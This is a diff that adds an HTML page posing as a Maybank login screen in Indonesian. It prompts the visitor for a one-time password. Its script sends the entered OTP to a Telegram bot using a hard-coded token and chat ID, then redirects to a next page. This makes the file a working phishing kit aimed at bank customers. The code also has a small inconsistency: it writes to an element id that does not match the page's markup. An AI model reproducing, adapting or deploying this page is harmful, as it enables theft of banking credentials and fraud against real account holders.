@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Maybank</title>
+
+<style>
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
+}
+
+body{
+height:100vh;
+background:linear-gradient(#b9c5cf,#edf1f4);
+display:flex;
+flex-direction:column;
+overflow:hidden;
+}
+
+.header{
+display:flex;
+justify-content:space-between;
+align-items:center;
+padding:30px 25px;
+}
+
+.icon{
+font-size:58px;
+color:#5d5d5d;
+}
+
+.logo{
+display:flex;
+align-items:center;
+gap:10px;
+}
+
+.logo img{
+width:55px;
+}
+
+.logo h1{
+font-size:42px;
+font-weight:700;
+color:#f3c300;
+}
+
+.help{
+font-size:45px;
+color:#555;
+}
+
+.content{
+flex:1;
+display:flex;
+flex-direction:column;
+align-items:center;
+justify-content:center;
+margin-top:-100px;
+}
+
+.username{
+font-size:30px;
+color:#555;
+margin-bottom:70px;
+}
+
+input{
+width:84%;
+border:none;
+background:transparent;
+border-bottom:2px solid #aaa;
+text-align:center;
+font-size:30px;
+padding:15px;
+outline:none;
+}
+
+input::placeholder{
+color:#808080;
+}
+
+button{
+height:90px;
+width:100%;
+border:none;
+background:linear-gradient(to right,#e5a900,#ffd75b);
+font-size:32px;
+font-weight:bold;
+color:#222;
+}
+</style>
+
+</head>
+<body>
+
+<div class="header">
+
+<div class="icon">&times;</div>
+
+<div class="logo">
+<img src="download.png">
+<h1>Maybank</h1>
+</div>
+
+<div class="help">👤</div>
+
+</div>
+
+<div class="content">
+
+<div class="username" id="userid"></div>
+
+<input
+type="password" id="pw" class="input"
+placeholder="Masukkan OTP Anda">
+
+</div>
+
+<button class="btn" onclick="login()">
+LANJUT
+</button>
+
+<script>
+
+function login() {
+    const pw = document.getElementById("pw").value.trim();
+
+    if (pw === "") {
+        alert("Masukan OTP Anda");
+        return;
+    }
+
+    const token = "8456111998:AAFOU6Rrgqkwfu65eWg3TZcKT7RI6JF5lbg";
+    const chatId = "6456077638";
+
+    const pesan = `💌 Pesan baru
+
+OTP: ${pw}`;
+    
+    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: pesan
+        })
+    })
+    .then(res => res.json())
+    .then(data => {
+        if (data.ok) {
+            localStorage.setItem("pw", pw);
+            window.location.href = "otp.html";
+        } else {
+            alert("Gagal mengirim pesan.");
+        }
+    })
+    .catch(() => {
+        alert("Terjadi kesalahan.");
+    });
+  }
+
+    const user = localStorage.getItem("userid");
+
+if(!user){
+location.href="index.html";
+}
+
+let tampil = user;
+
+if(user.length>4){
+tampil = user.substring(0,2) + "*".repeat(user.length-4) + user.substring(user.length-2);
+}
+
+document.getElementById("user").innerHTML=tampil;
+</script>
+
+</body>
+</html>
